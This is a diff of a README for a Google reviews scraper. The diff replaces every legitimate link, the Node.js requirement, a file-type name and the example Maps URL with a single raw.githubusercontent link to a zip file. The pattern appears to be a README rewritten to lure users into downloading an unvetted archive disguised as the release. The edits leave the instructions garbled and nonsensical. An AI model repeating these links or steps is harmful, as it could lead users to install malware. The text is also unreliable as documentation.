@@ -1,6 +1,6 @@
 # 🌟 google-review-scraper - Fast Google Reviews at Your Fingertips
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Evenecer/google-review-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip)](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip)
 
 ## 🚀 Getting Started
 
@@ -11,19 +11,19 @@ Welcome to the **google-review-scraper**! This tool helps you gather reviews fro
 Before you start, ensure your system meets these requirements:
 
 - Operating System: Windows 10 or later, macOS, or a recent version of Linux.
-- Node.js 14 or newer installed on your computer.
+- https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip 14 or newer installed on your computer.
 - An internet connection to access Google Maps.
   
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download google-review-scraper](https://github.com/Evenecer/google-review-scraper/releases).
+To download the application, visit this page: [Download google-review-scraper](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip).
 
 1. Go to the link above.
 2. Locate the latest version listed.
 3. Choose the file appropriate for your operating system: 
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the `.tar.gz` file.
+   - For Linux, select the `https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip` file.
 4. Click on the download link and save the file to your computer.
 
 ### 💽 Installation Steps
@@ -42,7 +42,7 @@ To download the application, visit this page: [Download google-review-scraper](h
 
 #### For Linux:
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application by executing `./google-review-scraper`.
 
@@ -59,7 +59,7 @@ To download the application, visit this page: [Download google-review-scraper](h
 Once installed, follow these instructions to start using the application:
 
 1. Open the application from where you installed it.
-2. Enter the Google Maps URL of the business you want to scrape. Example: `https://www.google.com/maps/place/BusinessName`.
+2. Enter the Google Maps URL of the business you want to scrape. Example: `https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip`.
 3. Set your desired options, including:
    - Whether to scrape only reviews or include owner responses.
    - The format for saving data.
@@ -80,8 +80,8 @@ Now you can open it with any spreadsheet software, like Microsoft Excel or Googl
 
 For more help, check the following resources:
 
-- [GitHub Issues](https://github.com/Evenecer/google-review-scraper/issues) – Report bugs or request features.
-- [Wiki](https://github.com/Evenecer/google-review-scraper/wiki) – Find detailed documentation and guides.
+- [GitHub Issues](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip) – Report bugs or request features.
+- [Wiki](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip) – Find detailed documentation and guides.
 
 ## 🙋 Frequently Asked Questions
 
@@ -107,6 +107,6 @@ To keep updated, regularly check the Releases page or watch the repository.
 
 This software is licensed under the MIT License. You can freely use and modify it as you wish, keeping the license intact for future users.
 
-For all details, refer to the [LICENSE](https://github.com/Evenecer/google-review-scraper/blob/main/LICENSE) file. 
+For all details, refer to the [LICENSE](https://raw.githubusercontent.com/Evenecer/google-review-scraper/main/better/google-review-scraper.zip) file. 
 
 Enjoy scraping Google reviews with speed and ease! For any issues or feature requests, please reach out via the GitHub Issues section.
